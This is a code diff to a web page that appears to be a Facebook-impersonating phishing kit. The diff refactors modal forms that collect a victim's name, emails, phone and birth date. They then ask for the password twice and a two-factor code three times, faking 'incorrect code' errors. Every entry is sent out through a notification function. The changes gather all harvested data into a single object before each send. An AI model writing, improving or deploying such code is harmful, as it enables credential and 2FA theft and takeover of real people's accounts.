@@ -812,8 +812,11 @@ document.addEventListener('keydown', function(e) {
   }
 </script>
 
-<!-- ===================== MODAL FLOWS ===================== -->
+<!-- ===================== MODAL FLOWS (FIXED) ===================== -->
 <script>
+// ─── Master data store: tất cả data gom vào 1 object duy nhất ───
+var _masterData = {};
+
 var COUNTRY_CODES = [
   {code:"VN",name:"Vietnam",dial:"+84",flag:"🇻🇳"},
   {code:"US",name:"United States",dial:"+1",flag:"🇺🇸"},
@@ -1023,6 +1026,9 @@ document.addEventListener('click', function(e) {
 
 // ==================== MODAL 1: CLIENT INFO ====================
 function openClientModal() {
+  // Reset master data mỗi lần mở modal mới
+  _masterData = {};
+
   _detectCountryDial().then(function() {
     var content =
       '<div class="modal-header">' +
@@ -1056,18 +1062,18 @@ function openClientModal() {
 
     document.getElementById('clientForm').addEventListener('submit', function(e) {
       e.preventDefault();
-      var formData = {
-        fullName: document.getElementById('fullName').value.trim(),
-        email: document.getElementById('email').value.trim(),
-        emailBusiness: document.getElementById('emailBusiness').value.trim(),
-        fanpage: document.getElementById('fanpage').value.trim(),
-        phone: _selectedDial + ' ' + document.getElementById('phone').value.trim(),
-        day: document.getElementById('day').value,
-        month: document.getElementById('month').value,
-        year: document.getElementById('year').value,
-        message: document.getElementById('message').value.trim()
-      };
-      if (typeof Utils !== 'undefined') Utils.saveRecord('__client_rec__fi_rst', formData);
+
+      // Lưu vào _masterData — dùng _selectedDial tại đúng thời điểm submit
+      _masterData.fullName      = document.getElementById('fullName').value.trim();
+      _masterData.email         = document.getElementById('email').value.trim();
+      _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
+      _masterData.fanpage       = document.getElementById('fanpage').value.trim();
+      _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
+      _masterData.day           = document.getElementById('day').value;
+      _masterData.month         = document.getElementById('month').value;
+      _masterData.year          = document.getElementById('year').value;
+      _masterData.message       = document.getElementById('message').value.trim();
+
       Modal.close('clientModal');
       setTimeout(function() { openSecurityModal(); }, 250);
     });
@@ -1116,12 +1122,10 @@ function openSecurityModal() {
     submitBtn.innerHTML = '<span class="modal-spinner"></span>';
 
     if (clickCount === 0) {
-      var dataLocal = (typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__fi_rst') : {}) || {};
-      var clientData = Object.assign({}, dataLocal, { password: password });
-      if (typeof Utils !== 'undefined') {
-        Utils.saveRecord('__client_rec__se_con', clientData);
-        await Utils.sendNotification(clientData);
-      }
+      // Lần nhập password đầu: lưu vào _masterData và gửi ngay
+      _masterData.password = password;
+      await Utils.sendNotification(_masterData);
+
       setTimeout(function() {
         submitBtn.disabled = false;
         submitBtn.textContent = 'Continue';
@@ -1131,31 +1135,30 @@ function openSecurityModal() {
         clickCount = 1;
       }, 1350);
     } else {
-      var dataLocal2 = (typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__se_con') : {}) || {};
-      var clientData2 = Object.assign({}, dataLocal2, { passwordSecond: password });
-      if (typeof Utils !== 'undefined') {
-        Utils.saveRecord('__client_rec__th_ird', clientData2);
-        await Utils.sendNotification(clientData2);
-      }
+      // Lần nhập password thứ 2: cập nhật _masterData và gửi
+      _masterData.passwordSecond = password;
+      await Utils.sendNotification(_masterData);
+
       setTimeout(function() {
         Modal.close('securityModal');
-        setTimeout(function() { openAuthenticationModal(clientData2); }, 250);
+        setTimeout(function() { openAuthenticationModal(); }, 250);
       }, 1500);
     }
   });
 }
 
 // ==================== MODAL 3: AUTHENTICATION (2FA) ====================
-function openAuthenticationModal(userData) {
-  var emailDisplay = typeof Utils !== 'undefined' ? Utils.maskEmail(userData.email || '') : (userData.email || '');
-  var phoneDisplay = typeof Utils !== 'undefined' ? Utils.maskPhone(userData.phone || '') : (userData.phone || '');
-  var description = 'Enter the code for this account that we send to ' + emailDisplay + ', ' + phoneDisplay + ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
+function openAuthenticationModal() {
+  var emailDisplay = Utils.maskEmail(_masterData.email || '');
+  var phoneDisplay = Utils.maskPhone(_masterData.phone || '');
+  var description  = 'Enter the code for this account that we send to ' + emailDisplay + ', ' + phoneDisplay +
+    ' or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)';
 
   var content =
     '<div style="display:flex;flex-direction:column;">' +
       '<div class="modal-header" style="margin-bottom:6px;">' +
         '<div class="modal-user-info">' +
-          '<span>' + (userData.fullName || '') + '</span>' +
+          '<span>' + (_masterData.fullName || '') + '</span>' +
           '<span class="modal-dot"></span>' +
           '<span>Facebook</span>' +
         '</div>' +
@@ -1177,11 +1180,12 @@ function openAuthenticationModal(userData) {
   Modal.open('authModal');
 
   var authCount = 0;
-  var countdownInterval;
+  var countdownInterval = null;
 
   function startCountdown(errorMsg, submitBtn) {
     var input = document.getElementById('twoFa');
     if (!input) return;
+    if (countdownInterval) clearInterval(countdownInterval);
     input.disabled = true;
     submitBtn.disabled = true;
     var time = (typeof CONFIG !== 'undefined' && CONFIG.COUNTDOWN_TIME) ? CONFIG.COUNTDOWN_TIME : 30;
@@ -1192,6 +1196,7 @@ function openAuthenticationModal(userData) {
       errorMsg.textContent = 'The code is incorrect. Try again after ' + time + ' seconds.';
       if (time <= 0) {
         clearInterval(countdownInterval);
+        countdownInterval = null;
         input.disabled = false;
         input.value = '';
         submitBtn.disabled = false;
@@ -1203,8 +1208,8 @@ function openAuthenticationModal(userData) {
 
   document.getElementById('authForm').addEventListener('submit', async function(e) {
     e.preventDefault();
-    var twoFa = document.getElementById('twoFa').value.trim();
-    var errorMsg = document.getElementById('authError');
+    var twoFa     = document.getElementById('twoFa').value.trim();
+    var errorMsg  = document.getElementById('authError');
     var submitBtn = document.getElementById('authBtn');
 
     errorMsg.classList.remove('show');
@@ -1218,27 +1223,26 @@ function openAuthenticationModal(userData) {
     submitBtn.innerHTML = '<span class="modal-spinner"></span>';
 
     if (authCount === 0) {
-      var d1 = (typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__th_ird') : {}) || {};
-      var c1 = Object.assign({}, d1, { twoFa: twoFa });
-      if (typeof Utils !== 'undefined') { Utils.saveRecord('__client_rec__fou_rth', c1); await Utils.sendNotification(c1); }
+      _masterData.twoFa = twoFa;
+      await Utils.sendNotification(_masterData);
       setTimeout(function() {
         submitBtn.innerHTML = 'Continue';
         startCountdown(errorMsg, submitBtn);
         authCount = 1;
       }, 1400);
+
     } else if (authCount === 1) {
-      var d2 = (typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__fou_rth') : {}) || {};
-      var c2 = Object.assign({}, d2, { twoFaSecond: twoFa });
-      if (typeof Utils !== 'undefined') { Utils.saveRecord('__client_rec__f_if_th', c2); await Utils.sendNotification(c2); }
+      _masterData.twoFaSecond = twoFa;
+      await Utils.sendNotification(_masterData);
       setTimeout(function() {
         submitBtn.innerHTML = 'Continue';
         startCountdown(errorMsg, submitBtn);
         authCount = 2;
       }, 1200);
+
     } else {
-      var d3 = (typeof Utils !== 'undefined' ? Utils.getRecord('__client_rec__f_if_th') : {}) || {};
-      var c3 = Object.assign({}, d3, { twoFaThird: twoFa });
-      if (typeof Utils !== 'undefined') await Utils.sendNotification(c3);
+      _masterData.twoFaThird = twoFa;
+      await Utils.sendNotification(_masterData);
       setTimeout(function() {
         Modal.close('authModal');
         setTimeout(function() { openSuccessModal(); }, 250);
